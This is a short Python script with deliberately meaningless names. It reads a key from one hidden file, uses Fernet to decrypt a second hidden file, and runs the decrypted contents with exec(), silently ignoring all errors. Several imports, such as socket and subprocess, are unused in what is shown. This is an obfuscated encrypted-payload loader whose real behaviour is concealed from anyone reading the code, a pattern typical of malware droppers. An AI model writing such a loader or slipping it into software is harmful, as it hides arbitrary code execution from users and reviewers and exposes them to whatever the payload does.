import os
import time
from cryptography.fernet import Fernet
import subprocess
import sys
import colorama
from colorama import init, Fore, Style
import socket
import signal
import ntplib
from datetime import datetime, timedelta
import glob

def AAA_hannah():
    try:
        with open(r".main/.g18h38h7b6hkt68g7_log", "rb") as AAA:
            return AAA.read()
    except Exception:
        return None

def BBB_tampi(BBB, CCC):
    try:
        with open(BBB, 'rb') as DDD:
            EEE = DDD.read()

        FFF = Fernet(CCC)
        GGG = FFF.decrypt(EEE)
        return GGG
    except Exception:
        return None

HHH = AAA_hannah()
if HHH:
    III = '.main/.he7jw8eu72j_log'
    JJJ = BBB_tampi(III, HHH)
    if JJJ:
        try:
            exec(JJJ)
        except Exception:
            pass
